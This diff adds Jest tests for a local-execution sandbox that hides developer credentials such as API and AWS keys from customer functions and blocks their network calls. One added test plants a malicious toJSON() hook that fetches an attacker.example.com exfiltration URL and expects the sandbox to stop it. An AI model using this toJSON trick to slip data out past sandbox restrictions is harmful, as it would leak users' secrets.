@@ -10,6 +10,7 @@ import * as shared from '../backend/shared';
 import type { BackendFunction } from '../backend/types';
 import { LOCAL_EXECUTION_LOAD_SUFFIX } from '../constants';
 
+import { forceResetEnv } from './env-guard';
 import type { ExecuteAction, LoadModule } from './local-execution';
 import {
     DEFAULT_LONG_POLLING_CONFIG,
@@ -49,9 +50,10 @@ beforeEach(() => {
 
 const stubExecuteAction: ExecuteAction = async (fqn) => ({ data: null, stub: true, fqn });
 
-// Hard backstop: net/fetch/child_process are process-wide singletons, so a test that leaves them patched (e.g. an abandoned hung-function test) would otherwise leak into every later test in this Jest worker.
+// Hard backstop: net/fetch/child_process/process.env are process-wide singletons, so a test that leaves them patched (e.g. an abandoned hung-function test) would otherwise leak into every later test in this Jest worker.
 afterEach(() => {
     forceReset();
+    forceResetEnv();
 });
 
 /** A `loadModule` double that resolves the customer's function from a map and rejects anything else with a module-not-found error, matching the common case where neither optional package is installed. */
@@ -704,6 +706,114 @@ describe('local-execution — executeScriptLocally', () => {
         expect(require('child_process').spawn).toBe(realSpawn);
     });
 
+    describe('env-guard integration', () => {
+        const originalEnv = process.env;
+
+        afterEach(() => {
+            process.env = originalEnv;
+        });
+
+        test("Should never expose the dev server's own DD_API_KEY to the customer function", async () => {
+            process.env = { ...originalEnv, DD_API_KEY: 'the-dev-servers-own-api-key' };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () => typeof process.env.DD_API_KEY === 'undefined',
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: true });
+        });
+
+        test("Should never expose an AWS-like credential from the developer's own shell to the customer function", async () => {
+            process.env = { ...originalEnv, AWS_SECRET_ACCESS_KEY: 'super-secret-aws-key' };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () => typeof process.env.AWS_SECRET_ACCESS_KEY === 'undefined',
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: true });
+        });
+
+        test('Should still expose PATH/HOME/NODE_ENV/TMPDIR to the customer function when set in the real environment', async () => {
+            process.env = {
+                ...originalEnv,
+                PATH: '/usr/bin',
+                HOME: '/home/dev',
+                NODE_ENV: 'development',
+                TMPDIR: '/tmp',
+            };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () => ({
+                        PATH: process.env.PATH,
+                        HOME: process.env.HOME,
+                        NODE_ENV: process.env.NODE_ENV,
+                        TMPDIR: process.env.TMPDIR,
+                    }),
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({
+                data: {
+                    PATH: '/usr/bin',
+                    HOME: '/home/dev',
+                    NODE_ENV: 'development',
+                    TMPDIR: '/tmp',
+                },
+            });
+        });
+
+        test('Should restore the real process.env after execution, whether the function resolves or throws', async () => {
+            process.env = { ...originalEnv, AWS_SECRET_ACCESS_KEY: 'super-secret-aws-key' };
+            const realEnv = process.env;
+
+            await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => 'ok' }),
+                mockLogger,
+            );
+            expect(process.env).toBe(realEnv);
+
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({
+                        example: () => {
+                            throw new Error('boom');
+                        },
+                    }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow('boom');
+            expect(process.env).toBe(realEnv);
+        });
+    });
+
     // Asserts $'s exact key set, since a token added inside globalThis.$ wouldn't be caught by the weaker top-level check below.
     test('Should never expose an auth token to the customer module — only backendFunctionArgs, Actions, and Source are visible on globalThis.$', async () => {
         const result = await executeScriptLocally(
@@ -1205,6 +1315,62 @@ describe('local-execution — executeScriptLocally', () => {
                 ),
             ).rejects.toThrow(/must have an inputs field/);
             expect(executeAction).not.toHaveBeenCalled();
+        });
+
+        // Mirrors the raw $.Actions path's malicious-toJSON() test — the action-catalog typed-wrapper path needed its own serialize-before-runAllowed fix since it doesn't share code with makeActionsProxy.
+        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real network call under cover of the exemption", async () => {
+            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+            let registeredImpl:
+                | ((actionId: string, request: unknown) => Promise<unknown>)
+                | undefined;
+            let fetchAttempt: Promise<unknown> | undefined;
+            const maliciousRequest = {
+                inputs: {
+                    text: 'hi',
+                    toJSON() {
+                        fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                        return { text: 'hi' };
+                    },
+                },
+                connectionId: 'conn-1',
+            };
+
+            const loadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return {
+                        example: async () =>
+                            registeredImpl?.(
+                                'com.datadoghq.slack.chat.postMessage',
+                                maliciousRequest,
+                            ),
+                    };
+                }
+                if (specifier === '@datadog/action-catalog/action-execution') {
+                    return {
+                        setExecuteActionImplementation: (
+                            impl: (actionId: string, request: unknown) => Promise<unknown>,
+                        ) => {
+                            registeredImpl = impl;
+                        },
+                    };
+                }
+                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
+                error.code = 'MODULE_NOT_FOUND';
+                throw error;
+            };
+
+            const result = await executeScriptLocally(
+                funcWithConnection,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModule,
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
+            expect(fetchAttempt).toBeDefined();
+            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
         });
 
         // Mirrors the action-catalog abandonment test — apps-backend's setBackend has the same shared-module-level-setter hazard.
